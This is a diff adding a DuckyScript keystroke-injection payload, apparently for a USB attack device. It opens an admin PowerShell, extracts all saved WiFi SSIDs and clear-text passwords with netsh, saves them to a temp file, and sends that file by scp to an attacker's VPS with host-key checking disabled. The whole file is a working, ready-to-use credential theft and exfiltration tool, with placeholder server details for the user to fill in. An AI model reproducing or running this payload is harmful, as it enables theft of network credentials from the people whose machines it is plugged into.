@@ -1,0 +1,91 @@
+REM Title: WiFi Passwords Exfiltration via SCP
+REM Author: zb0r
+REM Version: 1.0
+REM Description: This script finds WiFi SSIDs and passwords on a Windows machine, saves them to a file, and sends the file to a VPS using SCP.
+REM You need a VPS to use this script. Replace the #VPS_USER with your VPS username, #VPS_PASS with your VPS password, and #VPS_IP with your VPS IP address.
+
+REM Passive Windows Detection Extension
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        Windows fully passive OS Detection and passive Detect Ready
+        Includes its own passive detect ready.
+        Does not require additional extensions.
+
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+            $_OS will be set to WINDOWS or NOT_WINDOWS
+            See end of payload for usage within payload
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+
+    REM_BLOCK EXAMPLE USAGE AFTER EXTENSION
+        IF ($_OS == WINDOWS) THEN
+            STRING HELLO WINDOWS!
+        ELSE
+            STRING HELLO WORLD!
+        END_IF
+    END_REM
+END_EXTENSION
+
+DEFINE #VPS_IP 22.22.22.22
+DEFINE #VPS_USER testuser
+DEFINE #VPS_PASS testpassword
+
+REM Open PowerShell as admin
+GUI r
+DELAY 500
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 1000
+LEFT
+DELAY 500
+ENTER
+DELAY 500
+
+REM Find WiFi profiles and passwords
+STRINGLN $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object { $_ -replace "    All User Profile     : ", "" } | ForEach-Object { $_.Trim() }
+DELAY 500
+
+STRINGLN $wifiInfo = @()
+DELAY 500
+
+STRINGLN foreach ($profile in $profiles) { $profileName = $profile; $profileInfo = (netsh wlan show profile name=$profile key=clear) | Select-String "SSID", "Key Content"; $wifiInfo += [PSCustomObject]@{ ProfileName = $profileName; Password = $profileInfo -replace ".*Key Content            : ", "" } }
+DELAY 500
+
+REM Save WiFi information to a file
+STRINGLN $filePath = "$env:TEMP\wifi_profiles.txt"
+DELAY 500
+
+STRINGLN $wifiInfo | Format-Table -AutoSize | Out-File -FilePath $filePath
+DELAY 2000
+
+REM Upload the file via SCP to the target server
+STRINGLN scp -o StrictHostKeyChecking=no $filePath #VPS_USER@#VPS_IP:/home/#VPS_USER/Desktop/wifipass.txt
+DELAY 500
+
+REM Enter the VPS password
+STRINGLN #VPS_PASS
+DELAY 1000
+
+STRINGLN EXIT
